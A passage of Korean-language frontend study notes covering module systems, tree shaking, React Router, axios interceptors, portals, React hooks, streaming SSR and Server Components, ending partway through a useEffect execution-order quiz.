  | 항목          | CommonJS (CJS)                                                         | ES Modules (ESM)                                              |
  | ------------- | ---------------------------------------------------------------------- | ------------------------------------------------------------- |
  | 사용 환경     | Node.js                                                                | 브라우저 + Node.js(ESM 지원 시)                               |
  | 내보내기      | `module.exports`, `exports.foo`                                        | `export`, `export default`                                    |
  | 가져오기      | `require('...')`                                                       | `import ... from '...'`                                       |
  | 로딩 방식     | 런타임에 동기적으로, 파일 불러오는 동안 메인 스레드 차단 O             | 컴파일 타임에 정적으로, 파일 불러오는 동안 메인 스레드 차단 X |
  | 실행 시점     | 런타임에 모듈 해석                                                     | 컴파일 타임에 모듈 해석                                       |
  | 가져오기 위치 | 코드 어디서든 가능                                                     | 최상위 스코프에서만 가능 (비동기로 개선 가능)                 |
  | 트리 쉐이킹   | ❌ 불가능 (동적 require와 exports 객체 구조 때문에 정적 분석이 어려움) | ✅ 가능 (정적 구조 덕분에 정적 분석 가능)                     |
  | 파일 확장자   | `.js`, `.cjs`                                                          | `.mjs`, `.js` (with `"type": "module"`)                       |
  | 기본 방식     | Node.js에서 채택해서 사용 중                                           | 표준 모델 시스템, 최신 브라우저 및 ESM 설정된 Node.js         |

  ```javascript
  // require
  module.exports = moment;
  const moment = require("moment");
  ```

  ```javascript
  // import
  export default moment;
  import moment from "moment";
  ```

- CJS(CommonJS)가 트리쉐이킹이 안되는 자세한 이유

  1. 동적 require

  아무 위치에서나 불러올 수 있고 require() 호출과 module.exports 객체 할당이 런타임에 실행되기 때문에, 어떤 부분이 실제로 사용되는지 정적으로 파악하기 어렵다.

  ```javascript
  const lib = require(condition ? "a" : "b");
  ```

  2. exports가 객체 단위

  exports 시 객체 단위로 내보내기 때문에 번들러가 어떤 함수가 쓰이는지 알기 어려움 (구조 분해가 아님), 런타임에 동적으로 export 객체에 프로퍼티를 추가할 수 있기 때문에 정적으로 파악하기 어렵다.

  ```javascript
  // 객체 단위 export
  module.exports = {
    a: () => {},
    b: () => {},
  };

  // 런타임에 동적으로 export
  exports.add = (a, b) => a + b;

  if (someCondition) {
    exports.mul = (a, b) => a * b;
  }
  ```

<br>

### # 트리 쉐이킹 (Tree Shaking)

- 트리쉐이킹

  웹팩에서도 찾아볼 수 있고 네이밍에서도 알 수 있듯이 나무를 흔들어 필요없는 나뭇잎들을 떨어뜨린다는 뜻이다. 트리쉐이킹은 번들링 시 패키지 내부의 필요한 코드만 가져오고 필요없는 코드를
  제거하여 최적화하는 기법을 말한다. 번들 사이즈 및 빌드 시간을 줄일 수 있다. 웹팩은 ES6 이상의 import, export 표준 모듈 시스템을 사용하는 모듈에 대해 기본적인 트리쉐이킹을 지원한다.
  import 하는 패키지 내부에 사용하지 않는 export를 제거하는 것이다. 주의할 점은 ES5 이하 CommonJS 모듈 시스템을 사용하는 경우 트리쉐이킹이 적용되지 않는다. 이렇게 동작하는 이유는
  ESM은 컴파일 타임에 모듈을 로딩하기 때문에 트리쉐이킹이 가능하고 CJS는 런타임에 모듈을 로딩하기 때문에 트리쉐이킹이 불가능하다. 또한 바벨의 @babel/preset-env 사용 시 import가
  require로 변환될 수 있기 때문에 트리쉐이킹이 적용되지 않을 수 있다. 이 때 @babel/preset-env 속성 중 modules 속성을 false로 설정하면 ES 모듈을 CJS 모듈로 변환하지 않으므로
  문제를 해결할 수 있다.

- react의 컴파일 타임

  - 컴파일 타임은 코드가 브라우저에서 실행되기 전에, 번들러(예: Webpack, Vite), 트랜스파일러(예: Babel)가 코드를 해석하고 변환하는 시점이다.

  - 컴파일 타임이 빌드 타임에 포함

  - 예시 (React + TypeScript + Webpack 기준)

    - TS/JSX → JS 변환 → 컴파일 타임 (Babel, tsc)

    - JS, CSS, 이미지 등 리소스 통합/압축 → 빌드 타임 (Webpack, Vite 등)

<br>

### # **Link tag 특정 조건에서의 페이지 이동**

<br>

- Link tag 사용 시 특정 조건에서만 페이지 이동이 가능하도록 하려면 아래와 같은 코드로 작성할 수 있다.

  ```javascript
  // return문 외부
  const testHandler = (event) => {
    if (inputValue.length <= 0) event.preventDefault();
  };

  // return문 내부
  <Link className={btnClass} to="/search" key={id} onClick={testHandler}>
    <img alt="cart close icon" src={url} className={iconClass} />
  </Link>;
  ```

<br>

### # **Link tag 페이지 이동 시 props 전달하기**

<br>

- Link tag 페이지 이동 시 props를 전달할 수 있다.

  ```javascript
  <Link
    to={{
      pathname: '/search'
      state: {
        data1: year,
        data2: title,
        data3: summary
      }
    }}
  />
  ```

  전달 받은 props는 useLocation hook을 이용하여 사용할 수 있다.

  ```javascript
  import React from "react";
  import { useLocation } from "react-router";

  const Search = () => {
    const location = useLocation();
    console.log(location);
    ...
  }
  ```

<br>

### # **axios와 모듈화**

<br>

- 클라이언트에서 서버로 보내는 요청은 무수히 많기 때문에 모듈화가 거의 필수적이라고 볼 수 있다. 이미 설계된 모듈을 가져와 추가적인 HTTP method, 요청 URL, 파라미터 등만 사용하여 일관성 유지, 생산성 향상, 유지보수를 용이하게 할 수 있다. axios.create를 사용하여 axios 인스턴스를 생성하여 공통 header를 관리하고 axios interceptor request use를 통해 요청을 가로채 요청에 필요한 토큰 등을 심어줄 수 있다. 또한 axios 인스턴스를 활용하여 요청 로직을 일관되게 작성할 수 있다.

  (1) Axios 인스턴스 만들기

  ```javascript
  // api/axiosInstance.js
  import axios from "axios";

  // baseURL, headers 등 공통으로 사용할 옵션 세팅
  export const apiClient = axios.create({
    baseURL: process.env.REACT_APP_API_URL,
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Content-Type": "application/json",
    },
  });
  ```

  (2) 요청을 가로채기 위한 Interceptors

  아래와 같이 인스턴스를 만든 후에는 interceptors를 활용하여 요청 시 해당 요청을 가로챈 후 추가 로직을 구현할 수 있다. 아래 코드는 토큰을 심기 위해 사용하였다.

  ```javascript
  // api/axiosInstance.js
  apiClient.interceptors.request.use((config) => {
    const accessToken = localStorage.getItem("access_token");

    if (accessToken && config.headers) {
      config.headers["Authorization"] = `Bearer ${accessToken}`;
    }
    return config;
  });
  ```

  (3) 사용 예시

  ```javascript
  // api/todos.js
  import { apiClient } from "./axiosInstance";

  export const getTodos = async () => {
    return apiClient.get("/todos");
  };

  export const createTodo = async (todo) => {
    return apiClient.post("/todos", { todo });
  };

  export const updateTodo = async (id, todo, isCompleted) => {
    return apiClient.put(`/todos/${id}`, { todo, isCompleted });
  };

  export const deleteTodo = async (id) => {
    return apiClient.delete(`/todos/${id}`);
  };
  ```

<br>

- 모듈화 장점

  (1) 일관성 유지: 인터셉터를 사용하면 여러 곳에서 헤더에 토큰을 추가하는 것을 일관성 있게 관리할 수 있다.

  (2) 재사용성: 인터셉터를 설정하면 다른 API 호출에서도 자동으로 헤더에 토큰이 추가된다.

  (3) 유지보수성 향상: 코드를 보다 간결하고 관리하기 쉽게 만든다.

<br>

### # **modal Portals로 사용하기**

<br>

(1) modal이 생성 될 위치에 div 생성 (ex public/index.html)

```html
<body>
  <noscript>You need to enable JavaScript to run this app.</noscript>
  <div id="root"></div>
  <div id="modal-root"></div>
</body>
```

(2) modal Potal 만들기

```javascript
// src/components/ModalPortal.ts
import { ReactNode } from "react";
import ReactDom from "react-dom";

interface Props {
  children: ReactNode;
}

const ModalPortal = ({ children }: Props) => {
  const el = document.getElementById("modal-root") as HTMLElement;

  return ReactDom.createPortal(children, el);
};

export default ModalPortal;
```

(3) 실제 사용할 modal 만들기

```javascript
// src/components/LoginModal/LoginModal.tsx
import styles from "./loginModal.module.scss";

const LoginModal = ({ onClose }: any) => {
  return (
    <div className={styles.loginModal}>
      <div className={styles.content}>
        <h3>아이디와 비밀번호 모두 입력해주세요.</h3>
        <button type="button" onClick={onClose}>
          닫기
        </button>
      </div>
    </div>
  );
};

export default LoginModal;
```

(4) Portal을 사용하여 modal 사용하기

```javascript
import LoginModal from "components/Modal/LoginModal/LoginModal";
import ModalPortal from "components/Modal/ModalPortal";

const Login = () => {
  ...

  return (
    <div>
      ...

      {modalOpen && (
        <ModalPortal>
          <LoginModal onClose={HandleModalShow} />
        </ModalPortal>
      )}
    </div>
  );
};

export default Login;
```

<br>

### # **useRef hook 모달 영역 밖 클릭 시 닫기**

<br>

- useRef hook을 사용하여 모달 영역 밖 클릭 시 모달이 자동으로 닫히도록 구현할 수 있다.

  ```javascript
  const userMenu = useRef();
  const [isOpen, setIsOpen] = useState(false);

  const modalCloseHandler = ({ target }) => {
    if(isOpen && !userMenu.current.contains(target)) setIsOpen(false);
  };

  useEffect(() => {
    window.addEventListener('click', modalCloseHandler);

    // 모달 특성상 컴포넌트가 unmount 되는 주기가 많으므로 useEffect 부수 효과 함수안의 리턴문을 통해 click 이벤트를 remove 한다.
    return () => {
      window.removeEventListener('click', modalCloseHandler);
    };
  });

  return (
    {
      isOpen &&
      <Modal ref={userMenu}>
        ...
      </Modal>
    }
  );
  ```

<br>

### # useRef

- React에서 특정 값을 컴포넌트 생애주기 동안 계속 저장하고 싶을 때 쓰는 훅이다. 값을 저장할 뿐만 아니라, DOM 엘리먼트에 직접 접근할 때도 주로 사용한다. current 값 변경 시 리렌더링이 발생하지 않고 다른 state로 인해 리렌더링이 발생하여도 값을 유지한다.

  ```jsx
  // 값 저장용
  import React, { useRef } from "react";

  function Timer() {
    const countRef = useRef(0);

    function handleClick() {
      countRef.current += 1; // 변경해도 리렌더링 발생 x
      console.log(countRef.current); // 값은 유지됨
    }

    return <button onClick={handleClick}>Click me</button>;
  }
  ```

  ```jsx
  // DOM 접근용
  import React, { useRef } from "react";

  function InputFocus() {
    const inputRef = useRef(null);

    function focusInput() {
      inputRef.current.focus(); // 실제 DOM input에 포커스
    }

    return (
      <>
        <input ref={inputRef} />
        <button onClick={focusInput}>Focus Input</button>
      </>
    );
  }
  ```

<br>

### # useTransition / useDeferredValue

react 18에서 useTransition, useDeferredValue 두 가지 hook이 추가되었다. 이 두 가지 hook은 기존 debouncing과 throttling이 필요한 경우 사용할 수 있다.

<br>

- useTransition

  useTransition는 state의 업데이트를 늦춰준다. 일반 setState는 긴급 업데이트로 처리되고 useTransition의 startTransition로 래핑한 setState는 일반 setState보다
  느리게 동작한다. 즉 비동기로 동작하며 배치업데이트 되던 setState의 우선 순위를 지정할 수 있다. 사용법은 useTransition가 반환하는 첫번째 객체로 state 업데이트가 진행 중임을
  감지할 수 있고 두번째 객체로 업데이트를 늦출 state를 래핑할 수 있다. 예시로 사용자 입력에 따른 값이 큰 setState의 연산이 있는 경우 입력할 때마다 딜레이가 발생할 수 있는데
  해당 setState 연산을 useTransition로 래핑하여 사용자 입력이 딜레이 되지 않도록 하고 연산 시 isPending을 통해 로딩 UI를 노출해주며 사용자 경험을 향상시킬 수 있다.

  ```javascript
  import { useState, useTransition } from "react";

  const App = () => {
    const [input, setInput] = useState("");
    const [list, setList] = useState([]);
    const [isPending, startTransition] = useTransition();
    const bigList = [...Array(10000).keys()];

    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
      const value = e.target.value;
      setInput(value); // ✅ 긴급 업데이트: 사용자 입력 즉시 반영

      // 🕗 느린 업데이트: 무거운 작업은 나중에 천천히
      startTransition(() => {
        const filtered = bigList.filter((item) =>
          item.toString().includes(value)
        );
        setList(filtered);
      });
    };

    return (
      <div>
        <input value={input} onChange={handleChange} />
        {isPending && <div>로딩 중...</div>}
        <ul>
          {list.map((item) => (
            <li key={item}>{item}</li>
          ))}
        </ul>
      </div>
    );
  };
  ```

- useDeferredValue

  useTransition는 업데이트 순서에 직접 관여하는 반면 useDefferredValue는 업데이트 되는 값에 관여한다. useDefferredValue를 적용하는 경우 값이 완전히 처리되기 전까지
  이전 값을 표시한다. 사용법은 setState의 업데이트 값인 state를 전달받아 사용한다. 예시로 검색어 입력 중 입력 값에 따른 결과물 노출 시 검색어 입력이 완료되기 전 원하지 않는
  결과물이 노출되는 것을 막을 수 있다.

  ```javascript
  const UseDeferredValueTest = () => {
    const [query, setQuery] = useState("");
    const deferredQuery = useDeferredValue(query);

    return (
      ...
      <SearchResults query={query} />
    )
  }
  ```

<br>

### # React 18 Streaming SSR

- Streaming SSR이란

  기존 SSR의 동작 방식은 브라우저가 서버에서 렌더링이 완료된 HTML 파일(static)을 받아온 뒤 이 HTML 파일을 파싱한 후 사용자에게 우선적으로 보여준다. 그 후 javascript가 로드되면
  하이드레이션을 통해 사용자와 상호작용 가능하도록 한다. 이 때 서버에서 렌더링이 지연될 경우 TTFB가 늦어지고 이어서 FCP도 느려질 수 있다.

  또한 javascript 로드가 지연되는 경우 하이드레이션이 지연되어 TTI(사용자와 상호작용 시간)가 느려져 사용자 경험이 좋지 않아질 수도 있다. 이러한 상황을 개선하고자 React 18에서는 Streaming SSR가 추가되었다.

  `<Suspense>` 컴포넌트를 기준으로 서버에서 HTML을 청크(chunk) 단위로 나누고, 렌더링이 완료된 HTML 청크부터 스트리밍 형태로 브라우저에 전송한다. 클라이언트는 서버에서 도착하는
  HTML 청크를 순차적으로 그려나가며, 동시에 하이드레이션도 스트리밍처럼 병렬로 처리하여 전체 페이지가 준비되기 전이라도 사용자는 빠르게 일부 콘텐츠를 볼 수 있다.

  이러한 방식을 통해 TTFB, FCP, TTI를 개선하였다.

- Streaming SSR 구현 방법

  - react.js

    - `renderToPipeableStream()`(혹은 `renderToReadableStream()`) API + `<Suspense>`를 함께 사용해서 구현

  - next.js

    - Next.js에서는 Streaming SSR 기능을 App Router + 서버 컴포넌트(Server Component) 중심으로 기본적으로 자동 적용

      ```jsx
      // app/page.tsx
      import { Suspense } from "react";
      import SlowComponent from "./SlowComponent";

      export default function Page() {
        return (
          <>
            <h1>Hello</h1>
            <Suspense fallback={<p>로딩 중...</p>}>
              <SlowComponent />
            </Suspense>
          </>
        );
      }
      ```

<br>

### # React Server Component (RSC)

<br>

- React Server Component 도입 배경

  기존 React에서 Data fetching 시 대부분 아래와 같은 케이스 중 하나를 선택하여 API를 호출한다.

  - **부모 컴포넌트에서 거대한 API를 호출하여 자식의 props로 내려준다.**
  - **컴포넌트에 필요한 API를 각 컴포넌트에서 호출한다.**

  첫 번째 방법의 경우 부모 컴포넌트에서 거대한 API를 호출하여 API 요청 수를 줄일 수 있지만 데이터 오버 패칭 및 부모 컴포넌트와 자식 컴포넌트의 의존성이 높아지게 되어 재사용 및 유지보수가 어려워지게 된다.

  두 번째 방법의 경우 각 컴포넌트가 렌더링 될 때 필요한 데이터만 가져와 보여줄 수 있다는 장점이 있지만 API 요청 수가 많고 부모 컴포넌트가 렌더링 된 후 API를 요청하여 응답을 받아올 때까지 자식 컴포넌트의 렌더링과 API 호출이 지연된다. 또한 호출 지연이 발생하는 경우 나타나는 `Waterfall`로 인해 사용자 경험은 떨어지게 되고 UI가 밀리는 `Layout Shift`가 발생할 수 있다.

  또한 기존 Nextjs에서 SSR을 위해 getSeverSideProps를 사용했는데 getSeverSideProps는 중첩 컴포넌트 중 탑 레벨 컴포넌트에서만 사용이 가능했고 getSeverSideProps를 통해 받아온 데이터를 props 등으로 하위 컴포넌트로 내려주어야 한다는 문제가 있었다. 이러한 문제도 React Server Component 로 해결할 수 있다. RSC를 사용하면 서버와 클라이언트(브라우저)가 서로 협력하여 렌더링할 수 있다. 즉, 일부 컴포넌트는 브라우저에서, 일부 컴포넌트는 서버에서 렌더링할 수 있게 된다.

  마지막으로 번들 사이즈 문제도 해결할 수 있다. UI를 렌더링할 때 UI를 렌더링하는 데에는 필요하지 않은 데이터 처리 과정에 필요한 모듈까지 함께 번들링 되기 때문에 큰 프로젝트의 경우 브라우저가 받아와야 하는 파일의 용량이 매우 높아진다. 이 불필요한 청크들을 받아오는 것을 막기 위해 Code splitting이나 Lazy Loading과 같은 기술을 이용하지만 반복되는 작업과 시간 투자가 불편함으로 작용했다. 이러한 문제점도 `React Server Component`를 통해 해결할 수 있다. RSC를 사용해서 인터렉션이 없는 부분에 번들이 추가되지 않도록 할 수 있다. (Zero-Bundle)

<br>

- React Server Component의 장점

  - 자유로운 서버 리소스 접근과 빠른 데이터 패칭

    (요약 : 서버 컴포넌트는 서버에서 동작하기 때문에 데이터베이스, GraphQL, 파일 시스템, 인터널 서비스 등 서버 리소스에 직접 접근 할 수 있고 브라우저보다 더 빠르게 데이터를 가져올 수 있다.)

    서버 컴포넌트는 서버에서 동작하기 때문에 데이터베이스, GraphQL, 파일 시스템, 인터널 서비스 등 서버 사이드 데이터 소스에 직접 접근 할 수 있다. 서버는 공용 api 엔드 포인트를 거치지 않고 데이터를 직접 가져올 수 있고, 일반적으로 데이터 소스와 더 가깝게 배치되어 있으므로 브라우저보다 더 빠르게 데이터를 가져올 수 있다.서버에서 fetching한 데이터는 클라이언트 컴포넌트에 props로 전달 가능하다. 한 가지 유의해야 할 점은 json으로 인코딩 가능한 serializable props만 전달 가능하며 function은 전달할 수 없다.

  - 제로 번들 사이즈 컴포넌트

    (요약 : 서버 컴포넌트는 서버에서 렌더링 시 코드나 번들을 서버에서 다운로드하고 재사용하며 브라우저로 번들이 아닌 직렬화한 RSC 객체를 전달하여 자바스크립트 번들에 포함되지 않는다.)

    프론트엔드 앱을 개발하다 보면 무수한 라이브러리를 사용하게 된다. 직접 구현하기 까다로운 라이브러리들을 하나 둘 추가하다 보면 번들 사이즈가 늘게 되고, 퍼포먼스에 악영향을 끼치게 된다. 요즘은 많은 라이브러리들이 트리 셰이킹을 지원하고 필요에 따라 코드 스플리팅으로 렌더링에 필요한 번들 사이즈를 최대한 줄일 수 있지만 결국 번들 사이즈가 늘어나는 것은 막을 수 없다. 이것이 서버 컴포넌트가 고안 된 이유 중 하나이다. 클라이언트 컴포넌트와 다르게 서버 컴포넌트 코드는 브라우저에 다운로드 되지 않고 서버에서 미리 렌더링 된 static content를 전달하기 때문에 패키지를 추가해도 번들 사이즈에 영향을 끼치지 않는다. 즉 브라우저는 자바스크립트 번들을 모두 다운로드 해야하지만 서버는 모든 의존성을 미리 다운로드 해놓고 수시로 재사용 하기 때문에 무거운 코드 모듈을 저렴하게 사용할 수 있다. 즉 유저 인터랙션이 없는 컴포넌트들은 서버 컴포넌트로 사용하면 동일한 뷰를 제공함과 동시에 번들 사이즈와 초기 로딩 시간을 감소시킬 수 있다.

  - 자동 코드 스플리팅

    (요약 : 서버 컴포넌트에서 import 되는 모든 클라이언트 컴포넌트를 자동으로 코드 스플리팅하며 지연 로딩되는 컴포넌트를 미리 파악하여 더 빠른 번들 다운로드가 가능하다.)

    Code splitting이란 하나의 거대한 자바스크립트 번들을 여러 개의 작은 번들로 쪼개어 필요할 때마다 클라이언트로 전송하는 방법이다. 기존 클라이언트 컴포넌트에서는 `React.lazy`와 `dynamic import`를 사용하여 렌더링에 필요한 컴포넌트를 동적으로 불러왔었다. Code splitting은 앱의 퍼포먼스를 크게 향상할 수 있으나 두 가지 단점이 존재한다. 첫 번째로 lazy loading이 필요한 컴포넌트마다 일일이 `React.lazy`와 `dynamic import`를 적용해야 한다. 두 번째로는 부모 컴포넌트가 렌더링 된 이후 로딩을 시작하기 때문에 화면에 보이기 전 어느 정도의 딜레이가 존재한다는 점이다. 서버 컴포넌트는 이러한 단점을 두 가지 방식으로 해결했다. 서버 컴포넌트에서 import 되는 모든 클라이언트 컴포넌트를 Code splitting point로 간주하기 때문에 더 이상 일일이 `React.lazy`를 적용할 필요가 없어졌다. 또한 서버에서 미리 필요한 컴포넌트를 선택하기 때문에 클라이언트는 렌더링 프로세스 초기에 번들을 다운로드할 수 있다.

  - 컴포넌트 단위 SSR 전략

    기존 Nextjs에서 SSR을 위한 getSeverSideProps의 경우 중첩 컴포넌트 중 최상위 컴포넌트에서만 사용이 가능했고 받아온 데이터를 props로 내려주어야 한다는 문제가 있었다. 즉 페이지 단위 서버 사이드 렌더링 전략을 세워야했다. 하지만 서버 컴포넌트를 사용하면 컴포넌트 단위로 래핑해서 사용할 수 있기 때문에 페이지 단위가 아닌 컴포넌트 단위 서버 사이드 렌더링 전략을 세울 수 있다.

<br>

- 서버, 클라이언트, 공유 컴포넌트

  - 컴포넌트의 분류

    서버 컴포넌트가 도입되면서 리액트 컴포넌트는 크게 세 가지 컴포넌트로 분류되었다.

  - 서버 컴포넌트

    - 서버 컴포넌트란?

      - 서버에서만 렌더링되는 컴포넌트

      - 유저 인터랙티비티 제공 불가

    - 사용 시 주의사항

      - X : useState(), useReducer(), useEffect()와 같은 state / effects 사용 불가

      - X : DOM과 같은 브라우저 api 사용 불가

      - X : state / effects / 브라우저 api 사용하는 커스텀 훅 사용 불가

      - O : 데이터베이스 / 내부 서비스 / 파일시스템과 같은 server-only 데이터 사용 가능

      - O : 서버 컴포넌트 / 클라이언트 컴포넌트 / native elements (예: div, span) 임포트 및 렌더링 가능

      - O : 클라이언트 컴포넌트 props로 serializable한 데이터 전달 가능

    - 파일 네임 컨벤션

      `*.server.js` 혹은 컴포넌트 파일 내부 최상단 `use server` 선언, 모든 컴포넌트는 서버 컴포넌트가 디폴트

  - 클라이언트 컴포넌트

    - 클라이언트 컴포넌트란?

      - 클라이언트에서 렌더링 되거나 SSR을 통해 서버에서 렌더링 되는 컴포넌트

      - 유저 인터랙션 사용 가능

      - 서버 컴포넌트 도입 전 리액트 컴포넌트

    - 사용 시 주의사항

      - X : 서버 컴포넌트 import 불가, 다만 서버 컴포넌트는 클라이언트 컴포넌트에게 또 다른 서버 컴포넌트를 children props로 넘겨주는 건 가능 `예) 부모 서버 컴포넌트에서 클라이언트 컴포넌트인 ChildClient 컴포넌트와 서버 컴포넌트인 ChildServer import -> <ChildClient><ChildServer /></ChildClient>`

      - X : server-only 데이터 사용 불가

      - O : state / effects / 브라우저 api 사용 가능

    - 파일 네임 컨벤션

      `*.client.js` 컴포넌트 파일 내부 최상단 `use client` 선언, use client 에서 선언한 컴포넌트 아래 컴포넌트는 모두 클라이언트 컴포넌트로서 동작

  - 공유 컴포넌트

    - 공유 컴포넌트란?

      서버와 클라이언트에서 렌더링 되는 컴포넌트

    - 사용 시 주의사항

      - X : state / effects / 브라우저 api 사용 불가

      - X : 서버 컴포넌트 임포트 불가, server-only 데이터 사용 불가

      - O : 서버와 클라이언트 컴포넌트에서 임포트 되어 사용 가능

    - 파일 네임 컨벤션

      `*.js`

<br>

- 서버 컴포넌트(RSC)와 서버 사이드 렌더링(SSR)의 차이

  (1) 브라우저로 번들 전달 여부 : 서버 컴포넌트 번들은 클라이언트로 전달되지 않는다. 하지만 서버 사이드 렌더링의 모든 컴포넌트의 코드는 자바스크립트 번들에 포함되어 클라이언트로 전송된다.

  (2) 렌더링 전략 : 서버 컴포넌트는 페이지 레벨에 상관없이 모든 컴포넌트에서 서버에 접근 가능하여 컴포넌트 단위 SSR 전략을 세울 수 있다. 하지만 getServerSideProps의 경우 상위 레벨의 페이지에서만 사용할 수 있기 때문에 페이지 단위 SSR 전략을 세워야한다.

  (3) 데이터 리패치 시 상태 유지 : 서버 컴포넌트는 브라우저에 HTML이 아닌 RSC 객체로 전달되기 때문에 클라이언트 상태를 유지하며 데이터를 리패치 할 수 있다. 하지만 SSR의 경우 HTML로 전달되기 때문에 데이터 리패치 시 HTML 전체를 리렌더링이 하며 클라이언트 상태를 유지할 수 없다.

  (4) 결론 : 서버 컴포넌트는 서버 사이드 렌더링 대체가 아닌 보완의 수단으로 사용할 수 있다. 서버 사이드 렌더링으로 초기 HTML 페이지를 빠르게 보여주고, 서버 컴포넌트로는 브라우저로 전송되는 자바스크립트 번들 사이즈를 감소시킬 수 있다.

<br>

### # React 실행 순서 퀴즈 (with 패니지먼트 면접 시 시험지 문제)

- 첫 번째 문제 : useEffect 관련

  ```jsx
  import { useEffect, useState } from "react";

  const Main = () => {
    const [state, setState] = useState(0);

    console.log(state);

    useEffect(() => {
      setState(1); // 참고 사항 : 만약 setState(0)인 경우 콘솔에 0 -> useEffect 0까지 총 2번만 출력 됨
      console.log("useEffect", state);

      return () => {
        console.log("clean up", state);
      };
    }, [state]);

    return (
      <div className="wrap">
        <span>test1</span>
      </div>
    );
  };

  export default Main;
  ```

  ![react_실행_순서_패니지먼트_01-1](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/99ac2f3b-5038-42d3-93ab-b0aa47d44d97)

  결과는 0 -> "useEffect" 0 -> 1 -> "clean up" 0 -> "useEffect" 1 -> 1 순으로 출력된다. 즉 6번의 console log가 찍히게 된다. 왜 그런지 하나씩 살펴보자.

  1. 첫 번째 0의 경우 컴포넌트 마운트 시 컴포넌트 몸체 부분이 실행되어 출력된다.
  2. 컴포넌트 마운트 후 페인트 단계까지 완료되면 useEffect가 실행된다. 이 때 useEffect 내부에 setState가 존재하는데 setState는 비동기로 처리되기 때문에 백그라운드로 넘어가고 console.log("useEffect", state)가 먼저 실행되어 "useEffect" 0이 찍힌다.
  3. setState 처리 시 이전 값 0에서 1로 변경하기 때문에 리렌더링이 발생하게 된다.
  4. 리렌더링이 발생하여 컴포넌트 몸체 부분의 console.log(state)가 실행되고 1을 출력한다.
  5. useEffect의 dependency가 변경되었기 때문에 useEffect가 실행된다. 이 때 setState의 경우 비동기로 처리되기 때문에 백그라운드로 넘어가고 return 문 안에 클린업 함수가 존재하기 때문에 이전 useEffect 대한 클린업 함수를 실행한다. 즉 console.log("clean up", state) 실행 시 state는 이전 값을 가리키기 때문에 console.log("clean up", state)의 경우 clean up 0을 출력한다.
  6. useEffect 내부에 console.log("useEffect", state)가 실행되어 "useEffect" 1이 찍힌다.
  7. setState 처리 시 이전 값 1에서 1로 변경되기 때문에 원시 타입의 경우 불변성을 가지고 있어 새로운 메모리를 할당하는 것이 아닌 이전 값과 최신 값이 동일한 참조를 가리켜 리렌더링이 발생하지 않는 것이 맞지만 동일한 값이더라도 함수 몸체 부분은 한번 더 실행된다. 즉 비교하는 시점에서 함수 몸체 부분이 한번 더 실행되지만 실제 리렌더링은 발생하지 않는다. 그리고 그 후속 리렌더링은 건너뛰게 된다.

  - 참고 : https://legacy.reactjs.org/docs/hooks-reference.html
  - If your update function returns the exact same value as the current state, the subsequent rerender will be skipped completely.
  - If you update a State Hook to the same value as the current state, React will bail out without rendering the children or firing effects. (React uses the Object.is comparison algorithm.)

  아래 예시도 살펴보자.

  ```jsx
  import { useEffect, useState } from "react";

  const Main = () => {
    const [state, setState] = useState(0);

    console.log(state);

    return (
      <div className="wrap">
        <button onClick={() => setState(1)}>test</button>
      </div>
    );
  };

  export default Main;
  ```

  ![react_실행_순서_패니지먼트_01-2](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/3d964440-09b4-4a1b-9030-be7160a6285d)

  위 코드는 첫 번째 예시에서 같은 값으로 setState 했음에도 불구하고 함수 몸체 부분이 실행되어 마지막 콘솔이 한번 더 출력되는 과정을 테스트해보기 위한 코드이다. 위 코드에서 버튼을 10번 클릭했다고 가정해보자. 결과는 0 -> 1 -> 1 순으로 출력된다. 즉 3번의 console log가 찍히게 되고 그 이후로는 찍히지 않는다. 왜 그런지 하나씩 살펴보자.

  1. 첫 번째 컴포넌트 마운트 시 console.log(state)가 실행되고 useState의 초기 값인 0을 출력한다.
  2. 첫 번째 버튼 클릭 시 setState(1)이 동작하여 이전 값과 최신 값은 다른 참조를 가리키게 되어 리렌더링이 발생한다. 리렌더링 발생 시 함수 몸체 부분에 console.log(state)가 실행되고 업데이트 된 값이 1을 출력한다.
  3. 두 번째 버튼 클릭 시 setState(1)가 동작한다. 이 때 이전 값과 최신 값은 같은 참조를 가리키고 있어 리렌더링이 발생하지 않아야한다. 하지만 리렌더링이 발생하는 것처럼 함수 몸체 부분이 실행되어 콘솔에 1이 한번 더 출력된다. 즉 같은 값인 경우 비교하는 시점에 함수 몸체는 한번 더 실행하게 되고 그 이후 렌더링부터는 출력하지 않는 것을 알 수 있다. 용빈님이 보내주신 자료를 참고해보면 리액트에서 setState를 실행할 때 무조건 리렌더링을 수행하며 이전 값과 최신 값은 setState 호출 시에 비교하는 것이 아니라 리렌더링 후 큐에 보내졌던 setState 값을 useState hook을 통해 가져와 비교하는 것 같다. (더 자세한 내용은 아래 링크를 참고하여 더 찾아보자.. 어렵다..) 그렇기 때문에 첫번째 변경 시에는 새로운 값으로 업데이트 되었기 때문에 콘솔에 1이 한번 출력되고, 두번째 변경 시에도 같은 값이지만 우선 리렌더링이 되었기 때문에 함수 몸체 부분이 실행되어 한번 더 콘솔에 1이 출력되는 것이다. 하지만 그 이후에는 최적화를 위해 실행하지 않는다. 사실 잘 이해가 안된다.. ㅠ

  - 참고 (용빈님 답변)

    - 관련 질문 : https://github.com/facebook/react/issues/20817#issuecomment-778672150

    - 관련 코드 : https://github.com/facebook/react/blob/main/packages/react-reconciler/src/ReactFiberHooks.js#L3200-L3203

    - 스택오버플로우 : https://stackoverflow.com/questions/58208727/why-react-needs-another-render-to-bail-out-state-updates

- 두 번째 문제 : useEffect 내부 동시 setState

  ```jsx
  import { useEffect, useState } from "react";

  const Main = () => {
    const [state, setState] = useState(0);

    console.log(state);

    useEffect(() => {
      setState(1);
      console.log("useEffect", state);
      setState(2);
      console.log("useEffect", state);
      setState(3);
      console.log("useEffect", state);
    }, [state]);

    return (
      <div className="wrap">
        <span>test2</span>
      </div>
    );
  };

  export default Main;
  ```

  ![react_실행_순서_패니지먼트_02](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/a4dfd90a-f652-4b38-8094-8b0bb6ad3659)

  결과는 0 -> "useEffect" 0 -> "useEffect" 0 -> "useEffect" 0 -> 3 -> "useEffect" 3 -> "useEffect" 3 -> "useEffect" 3 -> 3 순으로 출력된다. 즉 9번의 console log가 찍히게 된다. 왜 그런지 하나씩 살펴보자.

  1. 컴포넌트가 마운트되면 로직단 상단에 console.log(state)가 우선 실행된다. state의 초기 값은 0이기 때문에 0을 출력한다.
